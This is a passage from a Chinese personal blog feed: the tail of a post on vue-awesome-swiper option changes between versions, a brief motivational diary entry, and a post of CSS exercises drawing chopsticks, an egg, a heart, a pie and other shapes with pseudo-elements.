class="attr">mousewheelControl</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">observeParents</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">debugger</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="注意！！！！"><a href="#注意！！！！" class="headerlink" title="注意！！！！"></a>注意！！！！</h3><p>这其中的autoplay和pagination和prevButton和nextButton等属性，在低版本中是允许这么使用的，并且可以功能正常生效，但是再高版本swiper中这样写不会生效，并且vue不会报错。<br>接下来我们看官网api，拿分页器pagination举个栗子：</p><p><img src="/Blog/2018/01/11/vue/%E5%85%B3%E4%BA%8EVueAwesomeSwiper%E5%9C%A8VUE%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/index/img.png"></p><p>在以前低版本的swiper是没有这样子的区分的！所以现在我们可以看看最新版本的swiper分页器的具体文档：</p><p><img src="/Blog/2018/01/11/vue/%E5%85%B3%E4%BA%8EVueAwesomeSwiper%E5%9C%A8VUE%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/index/img_1.png"></p><p>图中标记的部分很明显已经不同于低版本的swiper的使用方法。</p><p>还有一些区别官网的api已经写的很清楚了，感兴趣的小伙伴可以自行在官网api中阅读查看噢！</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>优秀的人总是孤独的，先努力成全自己，不会刻意合群。</title>
      <link href="/Blog/2017/12/22/daisy/%E4%BC%98%E7%A7%80%E7%9A%84%E4%BA%BA%E6%80%BB%E6%98%AF%E5%AD%A4%E7%8B%AC%E7%9A%84%EF%BC%8C%E5%85%88%E5%8A%AA%E5%8A%9B%E6%88%90%E5%85%A8%E8%87%AA%E5%B7%B1%EF%BC%8C%E4%B8%8D%E4%BC%9A%E5%88%BB%E6%84%8F%E5%90%88%E7%BE%A4%E3%80%82/index/"/>
      <url>/Blog/2017/12/22/daisy/%E4%BC%98%E7%A7%80%E7%9A%84%E4%BA%BA%E6%80%BB%E6%98%AF%E5%AD%A4%E7%8B%AC%E7%9A%84%EF%BC%8C%E5%85%88%E5%8A%AA%E5%8A%9B%E6%88%90%E5%85%A8%E8%87%AA%E5%B7%B1%EF%BC%8C%E4%B8%8D%E4%BC%9A%E5%88%BB%E6%84%8F%E5%90%88%E7%BE%A4%E3%80%82/index/</url>
      
        <content type="html"><![CDATA[<p>牛人总是优秀的相似，庸人总是颓废的一样。</p><p><img src="/Blog/2017/12/22/daisy/%E4%BC%98%E7%A7%80%E7%9A%84%E4%BA%BA%E6%80%BB%E6%98%AF%E5%AD%A4%E7%8B%AC%E7%9A%84%EF%BC%8C%E5%85%88%E5%8A%AA%E5%8A%9B%E6%88%90%E5%85%A8%E8%87%AA%E5%B7%B1%EF%BC%8C%E4%B8%8D%E4%BC%9A%E5%88%BB%E6%84%8F%E5%90%88%E7%BE%A4%E3%80%82/index/img.png"></p><p>朋友圈一直是让我深信不疑的力量，你所在的圈子很大的影响着个人的素质和思想深度(但终究还是理论，实际还是随波逐流)，既然无法刻意跳出现处的圈子，那便等待时间的迁移，为什么马云总是和巴菲特，盖茨等一起吃饭，一旦他掌握世界顶端的名流想法及自己领悟到，那将又会是跨世纪的成功。自己也是一样多听听比自己水平高的人在讨论的话题和他们思考的问题，也许当时你并不会理解，但终究有一天你会恍然大悟，这其中的所获必然是巨大的。</p><p>希望我能变有钱，然后整天没事就瞎逼逼了🤥🤥🤥嗯，经济基础决定上层建筑。</p>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自己练习的css动画（单标签）</title>
      <link href="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/"/>
      <url>/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h1 id="筷子css"><a href="#筷子css" class="headerlink" title="筷子css"></a>筷子css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;chopsticks&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.chopsticks&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 10px;</span><br><span class="line">height: 250px;</span><br><span class="line">background-color: #bb8855;</span><br><span class="line">left: 50%;</span><br><span class="line">border-radius: 3px;</span><br><span class="line">box-shadow: 0 0 2px 1px rgba(0,0,0,0.1), 0 -5px 1px 0 rgba(0,0,0,0.1) inset;</span><br><span class="line">&#125;</span><br><span class="line">.chopsticks::before&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 10px;</span><br><span class="line">height: 250px;</span><br><span class="line">background-color: #bb8855;</span><br><span class="line">left: 15px;</span><br><span class="line">border-radius: 3px;</span><br><span class="line">box-shadow: 0 0 2px 1px rgba(0,0,0,0.1), 0 -5px 1px 0 rgba(0,0,0,0.1) inset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img.png"></p><h1 id="鸡蛋css"><a href="#鸡蛋css" class="headerlink" title="鸡蛋css"></a>鸡蛋css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;egg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.egg&#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top: 20px;</span><br><span class="line">        left: 35px;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 100px;</span><br><span class="line">        z-index: 7;        </span><br><span class="line">        background-color: #fff;</span><br><span class="line">        transform:rotate(20deg);</span><br><span class="line">        border-radius: 50%/60% 60% 40% 40%;</span><br><span class="line">    &#125;</span><br><span class="line">.egg::before&#123;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 30%;</span><br><span class="line">    left: 21%;</span><br><span class="line">    width: 57%;</span><br><span class="line">    height: 51%;</span><br><span class="line">    background: #FC0;</span><br><span class="line">    border-radius: 50%/56% 60% 41% 44%;</span><br><span class="line">    box-shadow: 0 0 1px 1px #f90,0 0 1px 1px rgba(255, 153, 0, 0.5) inset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_1.png"></p><h1 id="勺子css"><a href="#勺子css" class="headerlink" title="勺子css"></a>勺子css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;scoop&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.scoop&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">height: 200px;</span><br><span class="line">width: 20px;</span><br><span class="line">background-color: #bb8855;</span><br><span class="line">left: 50%;</span><br><span class="line">border-radius: 8px;</span><br><span class="line">box-shadow: 0 0 1px 1px rgba(0,0,0,0.1),0 -5px 1px 1px rgba(0,0,0,0.1) inset;</span><br><span class="line">top: 10%</span><br><span class="line">&#125;</span><br><span class="line">.scoop::before&#123;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    height: 70px;</span><br><span class="line">    width: 59px;</span><br><span class="line">    background-color: #bb8855;</span><br><span class="line">    left: -94%;</span><br><span class="line">    top: -2%;</span><br><span class="line">    border-radius: 50%/60% 60% 40% 40%;</span><br><span class="line">    box-shadow: 0 0 1px 1px rgba(0,0,0,0.1), 0 -3px 3px 2px rgba(0,0,0,0.1) inset;</span><br><span class="line">&#125;</span><br><span class="line">.scoop::after&#123;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    height: 14px;</span><br><span class="line">    width: 6px;</span><br><span class="line">    background-color: rgba(0,0,0,0.1);</span><br><span class="line">    left: 49%;</span><br><span class="line">    top: 17%;</span><br><span class="line">    border-radius: 50%/68% 53% 40% 40%;</span><br><span class="line">    box-shadow: 0 0 10px 8px rgba(0,0,0,0.1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_2.png"></p><h1 id="爱心css"><a href="#爱心css" class="headerlink" title="爱心css"></a>爱心css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;love&quot;</span>&gt;</span>LOVE<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.love&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 100px;</span><br><span class="line">height: 100px;</span><br><span class="line">background-color: #c03;</span><br><span class="line">left: 40%;</span><br><span class="line">top: 30%;</span><br><span class="line">    transform: translate(-50%,-50%) rotate(45deg);</span><br><span class="line">    transform: rotate(45deg);</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 100px;</span><br><span class="line">&#125;</span><br><span class="line">.love::before,.love::after&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 100px;</span><br><span class="line">height: 100px;</span><br><span class="line">background-color: #c03;</span><br><span class="line">border-radius: 50%;</span><br><span class="line">left: -50%;</span><br><span class="line">z-index: -1;</span><br><span class="line">&#125;</span><br><span class="line">.love::after&#123;</span><br><span class="line">    top: -50%;</span><br><span class="line">    left: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_3.png"></p><h1 id="气泡css"><a href="#气泡css" class="headerlink" title="气泡css"></a>气泡css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;qipao&quot;</span>&gt;</span>气泡<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.qipao&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 200px;</span><br><span class="line">height: 100px;</span><br><span class="line">background-color: green;</span><br><span class="line">border-radius: 7px;</span><br><span class="line">top: 20%;</span><br><span class="line">left: 40%;</span><br><span class="line">text-align: center;</span><br><span class="line">line-height: 100px;</span><br><span class="line">&#125;</span><br><span class="line">.qipao::before&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">position: absolute;</span><br><span class="line">bottom: 0;</span><br><span class="line">left: 50%;</span><br><span class="line">border: 34px solid transparent;</span><br><span class="line">border-top-color: green;</span><br><span class="line">border-bottom: 0;</span><br><span class="line">border-left: 0;</span><br><span class="line">margin: 0 0 -34px -17px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_4.png"></p><h1 id="缺四角css"><a href="#缺四角css" class="headerlink" title="缺四角css"></a>缺四角css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;angle&quot;</span>&gt;</span>缺四角<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.angle&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 200px;</span><br><span class="line">height: 150px;</span><br><span class="line">left: 40%;</span><br><span class="line">top: 20%;</span><br><span class="line">background-color: pink;</span><br><span class="line">text-align: center;</span><br><span class="line">line-height: 150px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.angle&#123;</span><br><span class="line">background: </span><br><span class="line">linear-gradient(45deg,transparent 15px, pink 0) left bottom,</span><br><span class="line">linear-gradient(-45deg,transparent 15px,pink 0) right bottom,</span><br><span class="line">linear-gradient(135deg,transparent 15px,pink 0) left top,</span><br><span class="line">linear-gradient(-135deg,transparent 15px,pink 0) right top;</span><br><span class="line">    background-size: 50% 50%;</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_5.png"></p><h1 id="缺圆角css"><a href="#缺圆角css" class="headerlink" title="缺圆角css"></a>缺圆角css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;arc&quot;</span>&gt;</span>缺圆角<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.arc&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">top: 50%;</span><br><span class="line">left: 50%;</span><br><span class="line">width: 200px;</span><br><span class="line">height: 150px;</span><br><span class="line">background-color: pink;</span><br><span class="line">text-align: center;</span><br><span class="line">line-height: 150px;</span><br><span class="line">&#125;</span><br><span class="line">.arc&#123;</span><br><span class="line">background: </span><br><span class="line">radial-gradient(circle at left bottom,transparent 15px,pink 0) left bottom,</span><br><span class="line">radial-gradient(circle at right bottom,transparent 15px,pink 0) right bottom,</span><br><span class="line">radial-gradient(circle at left top,transparent 15px,pink 0) left top,</span><br><span class="line">radial-gradient(circle at right top,transparent 15px,pink 0) right top;</span><br><span class="line">background-size: 50% 50%;</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_6.png"></p><h1 id="梯形css"><a href="#梯形css" class="headerlink" title="梯形css"></a>梯形css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tixing&quot;</span>&gt;</span>梯形<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.tixing&#123;</span><br><span class="line">      position: absolute;</span><br><span class="line">      top:50%;</span><br><span class="line">      left: 50%;</span><br><span class="line">      transform:translate(-50%,-50%);</span><br><span class="line">      width: 160px;</span><br><span class="line">      padding: 60px;</span><br><span class="line">      text-align: center;</span><br><span class="line">      color: white;</span><br><span class="line">&#125;</span><br><span class="line">.tixing::before&#123;</span><br><span class="line">      content:&quot;&quot;;</span><br><span class="line">      position: absolute;</span><br><span class="line">      top: 0; right: 0; bottom: 0; left: 0;</span><br><span class="line">      transform:perspective(40px) scaleY(1.3) rotateX(5deg);</span><br><span class="line">      transform-origin: bottom;</span><br><span class="line">      background:deeppink;</span><br><span class="line">      z-index:-1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_7.png"></p><h1 id="圆盘css"><a href="#圆盘css" class="headerlink" title="圆盘css"></a>圆盘css</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=<span class="string">&quot;pie&quot;</span>&gt;圆盘&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">.pie&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>,-<span class="number">50%</span>);</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">180px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">180px</span>;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="attribute">line-height</span>: <span class="number">180px</span>;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, transparent <span class="number">50%</span>, <span class="number">#655</span> <span class="number">0</span>);</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pie</span>::before&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="attribute">background-color</span>: inherit;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line"><span class="attribute">transform-origin</span>: left;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pie</span><span class="selector-pseudo">:hover</span>::before&#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">1000deg</span>);</span><br><span class="line"><span class="attribute">transition</span>: transform <span class="number">5s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_8.png"></p><h1 id="平行四边形css"><a href="#平行四边形css" class="headerlink" title="平行四边形css"></a>平行四边形css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sibianxing&quot;</span>&gt;</span>平行四边形<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.sibianxing&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">top: 50%;</span><br><span class="line">left: 50%;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">width: 200px;</span><br><span class="line">height: 150px;</span><br><span class="line">line-height: 150px;</span><br><span class="line">text-align: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.sibianxing::before&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">position: absolute;</span><br><span class="line">z-index: -1;</span><br><span class="line">background-color: pink;</span><br><span class="line">left: 0;right: 0;top: 0;bottom: 0;</span><br><span class="line">transform: skew(.08turn);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_9.png"></p><h1 id="折角css"><a href="#折角css" class="headerlink" title="折角css"></a>折角css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zhejiao&quot;</span>&gt;</span>折角<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.zhejiao&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">width: 200px;</span><br><span class="line">height: 200px;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">top: 50%;</span><br><span class="line">left: 50%;</span><br><span class="line">text-align: center;</span><br><span class="line">line-height: 200px;</span><br><span class="line">background-color: pink;</span><br><span class="line">border-radius: 10px;</span><br><span class="line">background:linear-gradient(-150deg,transparent 1.5em, pink 0);</span><br><span class="line">&#125;</span><br><span class="line">.zhejiao::before&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">position: absolute;</span><br><span class="line">background: linear-gradient(to left bottom,transparent 50%, rgba(0,0,0,.2) 0, rgba(0,0,0,.4)) 100% 0 no-repeat;</span><br><span class="line">top: 0;</span><br><span class="line">right: 0;</span><br><span class="line">    width: 30px;</span><br><span class="line">    height: 47px;</span><br><span class="line">    border-bottom-left-radius: 10px;</span><br><span class="line">    transform: translateY(-20px) rotate(-28deg);</span><br><span class="line">    transform-origin: bottom right;</span><br><span class="line">    box-shadow: -.2em .2em .3em -.1em rgba(0,0,0,.15);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 